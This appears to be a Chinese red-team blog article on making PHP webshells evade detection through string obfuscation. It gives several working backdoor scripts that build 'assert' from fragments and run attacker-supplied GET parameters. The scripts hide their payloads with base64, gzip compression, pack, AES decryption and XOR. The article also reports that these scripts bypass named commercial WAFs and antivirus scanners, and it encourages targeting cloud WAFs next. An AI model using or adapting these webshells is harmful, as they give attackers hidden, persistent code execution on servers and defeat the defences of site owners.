> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZvQOJvJYAUMPWbLtLc5DZw)

webshell免杀（一）：字符串变形
===================

1.简单字符串拼接
---------

```
<?php  
$func = $_GET["func"];  
$a = "a";  
$s = "s";  
$c=$a.$s.$_GET["func2"];  
$c($func);  
?>  

```

### 免杀效果

### 某狗4.0

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBic34NPeceF6ibcbiahjCs3icWxaYsR9SJGGkZxXozQCwcGu0prD5qxUI4A/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsB8wRfUq2GNSo5NCm0H5Vgd0j1TeMpmZwa0hGSW8Gw0yIuI3PPtPkQtQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到这里非常简单的混淆就能绕过安全狗

### 某塔最新收费waf

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBdts6FoPNaMVyUzSFxAj6tM97gM9Pnx5YV5rwYcsU9wVX4h33vRrgpQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到这简单的混淆是无法绕过宝塔的

但是如果我们不使用敏感函数作为参数的话

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBQcNOibwAXADSlOAs0QyBZENJB7Vu4fibDBYT7e3PNqxYvGQjXnARd9dw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

还是可以发现其实只是过滤参数里的内容，其实依旧比较好绕过，下下面的字符串处理中，我们会使用到函数来进行流量加密和代码加密

2.利用字符串函数
---------

```
ucwords()  //把每个单词的首字符转换为大写  
ucfirst()  //首字符转换为大写  
trim()  //移除字符串两侧的字符  
substr_replace() //函数把字符串的一部分替换为另一个字符串  
substr()  //函数返回字符串的一部分  
strtr()  //函数转换字符串中特定的字符  
strtoupper()  //把所有字符转换为大写  
strtolower()  //把所有字符转换为小写  
strtok()  //函数把字符串分割为更小的字符串  
str_rot13()  //函数对字符串执行 ROT13 编码  
chr()  //从指定 ASCII 值返回字符  
hex2bin() //把十六进制值转换为 ASCII 字符  
bin2hex() //ASCII 字符的字符串转换为十六进制值  
gzcompress()、gzdeflate()、gzencode()  //字符串压缩  
gzuncompress()、gzinflate()、gzdecode()  //字符串解压  
base64_encode()  //base64编码  
base64_decode()  //nase64解码  
pack()  //数据装入一个二进制字符串  
unpack()  //从二进制字符串对数据进行解包  

```

在这里我们使用base64加参数加密

```
<?php  
$func = base64_decode($_GET["func"]);  
#cGhwaW5mbygp  
$a = "a";  
$s = "s";  
$c=$a.$s.$_GET["func2"];  
$c($func);  
?>  
  

```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsB53UFODeATyGo6yt5Nt25viaiamCIGHssEmsg9VZedibZwCFC1f14ojM8Q/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到绕过，成功了。。。。。可以看到对于收费的waf而言依旧比较好绕过，其实在webshell上的查杀大部分都是在于规则上的匹配，对于php而言如果想绕过的话基本上都是"功夫不负有心人",只要去花时间都是可以绕过的。如何在根本上去减少webshell带给服务器的危险，其实直接禁用一些关键函数，和不使用有危险的扩展是非常有效的方法。虽说现在我们已经绕过了常见的waf，但是在真正的渗透中，目标都使用的是更高级的云waf，不但规则更新的比较快而且，还会将被拦截webshell进行记录，存在被溯源，和绕过的新思路被发现的可能，因此学习更多的混淆技巧，是比较重要的。

> 接下来讲解一下不常用的函数

### gzcompress系列

```
<?php  
$a = gzcompress("abc");  
echo "压缩后: ".$a;  
  
echo "<br>解压后: ".gzuncompress($a);  
?>  

```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBXnicWQicLeuF4GSPw75gYjO3STj5nCHMoiaibjHYcW8WvOvR1ibYNehibxXA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到这里解压后的内容变成了一堆乱码，在这里值得注意的是，如果我们利用方式依旧像base64一样是行不通，因为这一串乱码是无法提过字符串的形式准确的返回给服务端的

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBQV1gzpyvY9O8gYyP2UdFDdCFPHvQkO9dGQlfNSTwRXbKcqlicVNxtMg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

这里笔者提供两个思路：

1.base64编码

再次利用base64编码，如果没有经验的兄弟可能会认为这是多此一举，我直接用base64不就完了么，其实在真正的对抗当中，很多安全设备是可以识别base64编码的，可以自动解码判断解码后的内容。这一不其实就是为了，防止被解码后，内容被识别

```
<?php  
$func = gzuncompress(base64_decode($_GET["func"]));  
$a = "a";  
$s = "s";  
$c=$a.$s.$_GET["func2"];  
$c($func);  
?>  

```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBEic74us6FEOCribohLPLJDwhL4xVtOX0TyxLY7XHeCsTj55gNSOXHficQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

2.伪装成文件,以二进制方式传输

这种发送迷惑性比较大，很少有waf会去识别二进制流中的内容，顶多就是一些简单的正则表达式去匹配一些字符串，乱码根本就不全去识别

由于不能直接防止粘贴，因此需要在本地生成二进制文件

```
<?php  
$a = gzcompress("phpinfo();");  
file_put_contents("123.txt",$a);  
?>  

```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBHnlBHMZuUy3VIicvmyIJEA3Bl0ibowPuW4k51UYfvRqXh7lnEiaE77nnA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

在本地搭建一个上传页面只为获取数据包

源码如下

```
<!DOCTYPE html>  
<html lang="zh-CN">  
<head>  
    <meta charset="utf-8" />  
    <title>文件上传</title>  
</head>  
<body>  
<form method="post" enctype="multipart/form-data" action="">  
    <input type="file" >  
    <button type="submit" >上传</button>  
</form>  
</body>  
</html>  
<?php  
printf($_FILES);  
  

```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBVg4ouAiaS7pwPhS6q2ITNENNUhyPFIaSrbjVZic0yVicKZCqtgwicncHYA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到这些后缀和mime这些都是文件上传的敏感点，只要我们不去触发的话，waf还是会对我们很信任的

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsBI1ueKVEcYbCs2emtGVpSiaRKX5oRic6xTzppZHEOmz1242tVskV8poDQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到这里执行了phpinfo，关键在于这串字符是非常难解析的，一般的waf是无法解析出来的

### pack系列

```
<?php  
  
$func=pack("H14","706870696e666f");  
  
$a = "a";  
$s = "s";  
$c=$a.$s.$_GET["func2"];  
$c($func);  
  

```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v7DsFaEeC7EFt6uU4RUynsB1VAT0NI730sXDk4ZFicA3Qev5BoUqqWyODFmahaoJ6XmaoKHswBng7w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

如果有经验的同学可能会觉得这个和hex2bin非常相似，其实pack函数比hex2bin强大的多

> 语法：

```
unpack(format,data)  
  
data。规定被解包的二进制数据。  
  
format。规定在解包数据时所使用的格式。  
可能的值：  
  
a - NUL 填充的字符串  
A - SPACE 填充的字符串  
h - 十六进制字符串，低位在前  
H - 十六进制字符串，高位在前  
c - signed char  
C - unsigned char  
s - signed short（总是16位, machine 字节顺序）  
S - unsigned short（总是16位, machine 字节顺序）  
n - unsigned short（总是16位, big endian 字节顺序）  
v - unsigned short（总是16位, little endian 字节顺序）  
i - signed integer（取决于 machine 的大小和字节顺序）  
I - unsigned integer（取决于 machine 的大小和字节顺序）  
l - signed long（总是32位, machine 字节顺序）  
L - unsigned long（总是32位, machine 字节顺序）  
N - unsigned long（总是32位, big endian 字节顺序）  
V - unsigned long（总是32位, little endian 字节顺序）  
f - float（取决于 machine 的大小和表示）  
d - double（取决于 machine 的大小和表示）  
x - NUL 字节  
X - 备份一个字节  
Z - NUL 填充的字符串  
@ - NUL 填充绝对位置  

```

此函数提供了多中格式，可以将文件或者流量变得更加复杂

3.加密函数与自写加密函数
-------------

### openssl加密函数：

openssl_encrypt方法详解：

```
openssl_encrypt($data, $method, $key, $options = 0, $iv = "", &$tag = NULL, $aad = "", $tag_length = 16)  
  
参数：  
  
1.$data：加密明文  
2.$method：加密方法： 可以通过openssl_get_cipher_methods()获取有哪些加密方式  
3.$passwd：加密密钥[密码]  
4.$options：数据格式选项（可选）【选项有：】：0,OPENSSL_RAW_DATA=1,OPENSSL_ZERO_PADDING=2,OPENSSL_NO_PADDING=3  
5.$iv：密初始化向量（可选),需要注意：如果method为DES−ECB，则iv无需填写  
6.$tag：使用 AEAD 密码模式（GCM 或 CCM）时传引用的验证标签(可选)  
7.$aad：附加的验证数据。（可选）  
8.$tag_length：验证 tag 的长度。GCM 模式时，它的范围是 4 到 16(可选)  
  

```

openssl_decrypt方法详解:

```
openssl_decrypt($data, $method, $password, $options = 1, $iv = "", $tag = "",  $aad = "")  
参数：  
  
1.$data：要解密的加密消息。  
2.$method：解密方法：可以通过openssl_get_cipher_methods()获取有哪些解密方式  
3.$passwd：解密密钥[密码]  
4.$options：数据格式选项（可选）【选项有：】0,OPENSSL_RAW_DATA=1,OPENSSL_ZERO_PADDING=2,OPENSSL_NO_PADDING=3  
5.$iv：密初始化向量（可选),需要注意：如果method为DES−ECB，则iv无需填写  
6.$tag：AEAD密码模式下的身份验证标签(可选)  
7.$aad：附加的验证数据。（可选）  

```

函数基本使用:

```
<?php  
// 要加密的字符串  
$data = 'demo';  
// 密钥  
$key = '123456';  
// 加密数据 'AES-128-ECB' 可以通过openssl_get_cipher_methods()获取  
$encrypt = openssl_encrypt($data, 'AES-128-ECB', $key, 0);  
echo "加密后： ".$encrypt;  
  
//密钥  
$key = '123456';  
// 解密数据  
$decrypt = openssl_decrypt($encrypt, 'AES-128-ECB', $key, 0);  
echo "<br>解密后： ".$decrypt;  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

实际利用:

```
<?php  
$key = "password";  
  
$fun = openssl_decrypt($_GET['func'], 'AES-128-ECB', $key, 0);  
$a = "a";  
$s = "s";  
$c=$a.$s.$_GET["func2"];  
$c($fun);  
  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 自己写加密算法

这种方式也比较简单，在很多ctf题目中都喜欢考与，或，取反，异或等进行绕过，其中可以直接用他们进行加密操作，当然如果学过密码学，一些简单的加密方式其实也行，凯莎密码，维吉尼亚密码，替换加密等都是可以尝试的，但是更复杂的算法还是建议，能使用现成的扩展就直接用，没必要花太多时间去研究这些算法。

下面就以异或加密为例：

```
<?php  
<?php  
  
$key = "password";  
  
//ERsDHgEUC1hI  
$fun = base64_decode($_GET['func']);  
for($i=0;$i<strlen($fun);$i++){  
    $fun[$i] = $fun[$i]^$key[$i+1&7];  
}  
$a = "a";  
$s = "s";  
$c=$a.$s.$_GET["func2"];  
$c($fun);  
  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在看一下vt的查杀率

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以看到这没有一个查出来，讲了这么多，大家其实已经发现的webshell的免杀远比木马免杀容易得多，其实我们的目光不能再放在什么某狗，某盾，某塔，这些waf上，应该将目标定为于新型的云waf上。当然这只是免杀的一部分，后面还有继续讲解其他免杀方式。

加下方wx，拉你一起进群学习

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

利用卷影拷贝服务提取ntds.dit



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498091&idx=1&sn=5d3a86dab1bc6d0d97755d67de3e164e&chksm=ce6743d7f910cac115dd184a777cfea6a2a5a7a759d51dfc108b6c75bf1c42aa3ebc4dae07ff&scene=21#wechat_redirect)

[

从mimikatz抓取密码学习攻防



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497664&idx=1&sn=c63231e4cfca59a548b9d1de4bd66417&chksm=ce674d7cf910c46ac33e994d91486e197ed884461646096a0e4d0eeaf289e7adaf2c8097d7e0&scene=21#wechat_redirect)

[

shellcode编写探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497564&idx=1&sn=e061aea7457034672babe21d307c5a0b&chksm=ce674de0f910c4f66c5c05653005337f7df136b03a757a1549920086d1bbd5467904e59e0ca1&scene=21#wechat_redirect)

[

windows消息机制详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497563&idx=1&sn=d02e171994a3cf914fd41d91e7f3f560&chksm=ce674de7f910c4f1a743226847722370202de0b1ef537f4102f2179d9197b23f92f7de8c7f82&scene=21#wechat_redirect)

[

自删除技术详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497473&idx=1&sn=b56bc8bf42442f8917f5903f470fbc77&chksm=ce674dbdf910c4ab7b5b8205d29e381774b69f3a4e8c23fdad5da0eaba7cc0d8f00f95d7c03b&scene=21#wechat_redirect)

[

浅谈域渗透中的组策略及gpp运用



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497405&idx=1&sn=a85e56f2effd7607d89061f48e70105c&chksm=ce674c01f910c517b8d8c0aed95e6052438fee78210ece8dbabec422b29e095950110f46cac6&scene=21#wechat_redirect)

[

APC机制初探



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497042&idx=1&sn=e0866a963f6e6eb9c3d9b7b2bd5364f8&chksm=ce674feef910c6f8aa07e56161458b93db0573039b434e951095086d46f09b1e6a41e45c85d5&scene=21#wechat_redirect)

[

绕过360添加计划任务



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247496617&idx=1&sn=343036b85a7dce114d797d7686c493ff&chksm=ce674915f910c0036ad417501ef42d849f7ca4dec220859d2f044ee7cee312c4fd58c24f4ac5&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 78篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)